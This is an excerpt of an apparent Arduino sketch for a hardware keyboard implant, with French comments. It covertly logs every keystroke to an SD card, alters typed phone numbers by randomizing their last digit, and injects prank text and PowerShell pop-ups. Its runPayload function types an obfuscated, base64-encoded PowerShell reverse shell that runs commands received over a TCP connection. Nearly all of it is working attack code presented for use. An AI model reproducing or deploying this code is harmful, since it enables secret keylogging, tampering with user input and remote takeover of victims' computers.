...
char digitBuffer[MAX_BUFFER_SIZE];  // pour stocker les chiffres
char charBuffer[MAX_BUFFER_SIZE];   // pour stocker des caractères alphabétiques
int digitCount = 0;
int charCount = 0;
...
void OnPress(int key)
{
  ...
  if (key >= '0' && key <= '9') {  // Si c'est un chiffre
		if (digitCount < MAX_BUFFER_SIZE) {
		  digitBuffer[digitCount++] = key;
		}
		if (digitCount == 9 && digitBuffer[0] == '0') {
		// 9 chiffres d'affilé qui commence par 0, alors le 10ème est aléatoire
		  int randomDigit = random(0, 10); // génère un chiffre aléatoire entre 0 et 9
		  Keyboard.print(randomDigit);
      digitCount = 0;
		// Ajouter la logique pour envoyer le chiffre aléatoire à votre dispositif si nécessaire
		}
  } else {
    digitCount = 0;  // Réinitialiser le compteur si une touche non-chiffre est appuyée
  }
  if (key >= '0' && key <= '9') {  // Si c'est un chiffre
    if (digitCount == 2 && digitBuffer[digitCount - 2] == '6' && digitBuffer[digitCount - 1] == '9') {
      // Si les 2 derniers chiffres sont '6' et '9', print "nice"
      // Keyboard.print("niiiicceee");
      runNiceP();
      // Ajouter la logique pour envoyer "nice" à votre dispositif si nécessaire
      digitCount = 0;  // Réinitialiser le compteur
    }
  } else {
    digitCount = 0;  // Réinitialiser le compteur si une touche non-chiffre est appuyée
  }
  ...
  if (key >= 'A' && key <= 'Z') {  // Si c'est une lettre

    if (charCount < MAX_BUFFER_SIZE) {
      charBuffer[charCount++] = key;
    }
    if (charCount >= 4 && strncmp(charBuffer + charCount - 4, "quoi", 4) == 0) {
      // Si les 4 derniers caractères sont "QUOI", ajoute "feur"
      Keyboard.print("feur");
      charCount = 0;
      // Ajouter la logique pour envoyer "feur" à votre dispositif si nécessaire
    }
  }else {
    charCount = 0;  // Réinitialiser le compteur si une touche non-lettre est appuyée
  }

  File myFile = SD.open("/keystrokes.txt", FILE_WRITE);
  if (myFile) {
...
void blinkLED(int count, int delayMs) {
  // Faire clignoter la LED intégrée du nombre de fois spécifié avec un délai donné
...
void runPayload() {
	...
	Keyboard.print("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGU");
	delay(300);
  Keyboard.print("AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO");
	delay(300);
	Keyboard.print("AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa");
	delay(300);
  Keyboard.print("QBlAG4AdAAoACIAMQAyADcALgAwAC4AMAAuADEAIgAsAD");
	delay(300);
	Keyboard.print("gAMAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJAB");
	delay(300);
	Keyboard.print("jAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgA");
	delay(300);
	Keyboard.print("KQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgA");
	delay(300);
	Keyboard.print("D0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdw");
	delay(300);
	Keyboard.print("BoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEA");
	delay(300);
	Keyboard.print("bQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsAC");
	delay(300);
	Keyboard.print("AAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtA");
	delay(300);
	Keyboard.print("G4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBl");
	delay(300);
	Keyboard.print("AHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQB");
	delay(300);
	Keyboard.print("lACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQ");
	delay(300);
	Keyboard.print("BJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAa");
	delay(300);
	Keyboard.print("QBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsA");
	delay(300);
	Keyboard.print("JABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQ");
	delay(300);
	Keyboard.print("AZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQ");
	delay(300);
	Keyboard.print("AcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACA");
	delay(300);
	Keyboard.print("APQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAA");
	delay(300);
	Keyboard.print("IgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAP");
	delay(300);
	Keyboard.print("gAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdA");
	delay(300);
	Keyboard.print("BlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwB");
	delay(300);
	Keyboard.print("JAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABi");
	delay(300);
	Keyboard.print("AGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0A");
	delay(300);
	Keyboard.print("GUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAG");
	delay(300);
	Keyboard.print("QAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUA");
	delay(300);
	Keyboard.print("YQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");
	delay(100);
	typeKey(KEY_RETURN);
...
void runNiceP() {
  ...
  Keyboard.print("Add-Type -AssemblyName System.Windows.Forms");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$global:balmsg = New-Object ");
	delay(100);
  Keyboard.print("System.Windows.Forms.NotifyIcon");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$path = (Get-Process -id $pid).Path");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.Icon = [System.Drawing.Icon]:");
	delay(100);
  Keyboard.print(":ExtractAssociatedIcon($path)");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.BalloonTipIcon = [System.Windows.Forms");
	delay(100);
  Keyboard.print(".ToolTipIcon]::Warning");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.BalloonTipText = 'NIIIIICE'");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.BalloonTipTitle = 'Attention !!!'");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.Visible = $true");
	delay(100);
	typeKey(KEY_RETURN);
  Keyboard.print("$balmsg.ShowBalloonTip(20000)");
	delay(100);
	typeKey(KEY_RETURN);
